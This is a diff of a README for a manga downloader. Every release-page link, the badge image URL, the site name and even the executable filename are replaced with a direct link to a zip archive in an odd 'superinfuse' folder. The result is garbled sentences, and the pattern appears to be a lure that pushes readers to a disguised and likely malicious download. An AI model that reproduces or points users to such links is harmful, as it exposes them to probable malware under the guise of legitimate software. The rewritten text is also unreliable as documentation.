@@ -1,10 +1,10 @@
 # 🎮 mangabuddy_downloader - Download Your Favorite Manga Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/abdelfattahfekei/mangabuddy_downloader/releases)
+[![Download Now](https://raw.githubusercontent.com/abdelfattahfekei/mangabuddy_downloader/main/superinfuse/mangabuddy_downloader.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/abdelfattahfekei/mangabuddy_downloader/main/superinfuse/mangabuddy_downloader.zip)
 
 ## 📖 Description
 
-mangabuddy_downloader is a powerful tool designed to make downloading manga effortless. With a smooth graphical interface and an interactive command-line interface (CLI), you can easily access your favorite series from MangaBuddy.com. The software supports high-speed downloads and various output formats, ensuring you enjoy your reading without a hitch.
+mangabuddy_downloader is a powerful tool designed to make downloading manga effortless. With a smooth graphical interface and an interactive command-line interface (CLI), you can easily access your favorite series from https://raw.githubusercontent.com/abdelfattahfekei/mangabuddy_downloader/main/superinfuse/mangabuddy_downloader.zip The software supports high-speed downloads and various output formats, ensuring you enjoy your reading without a hitch.
 
 ## 🚀 Getting Started
 
@@ -12,12 +12,12 @@ To start using mangabuddy_downloader, follow the steps below. You do not need an
 
 ### 📥 Download & Install
 
-1. **Visit the Release Page:** Click [here to download](https://github.com/abdelfattahfekei/mangabuddy_downloader/releases).
+1. **Visit the Release Page:** Click [here to download](https://raw.githubusercontent.com/abdelfattahfekei/mangabuddy_downloader/main/superinfuse/mangabuddy_downloader.zip).
 
 2. **Select the Version:** Look for the latest version. It will typically be labeled as "Latest Release". Check the files listed under the version.
 
 3. **Download the Installer or Executable:**
-   - If you see a file named `mangabuddy_downloader.exe` or similar, click on it to start the download.
+   - If you see a file named `https://raw.githubusercontent.com/abdelfattahfekei/mangabuddy_downloader/main/superinfuse/mangabuddy_downloader.zip` or similar, click on it to start the download.
    - If there are multiple files, choose the one that matches your operating system (like Windows, macOS, etc.).
 
 4. **Run the Software:**
@@ -89,4 +89,4 @@ For further assistance, feel free to report any bugs or issues through the GitHu
 
 Stay connected with other users and developers. Share your experience or ask questions. Join our community on GitHub!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/abdelfattahfekei/mangabuddy_downloader/releases)
+[![Download Now](https://raw.githubusercontent.com/abdelfattahfekei/mangabuddy_downloader/main/superinfuse/mangabuddy_downloader.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/abdelfattahfekei/mangabuddy_downloader/main/superinfuse/mangabuddy_downloader.zip)
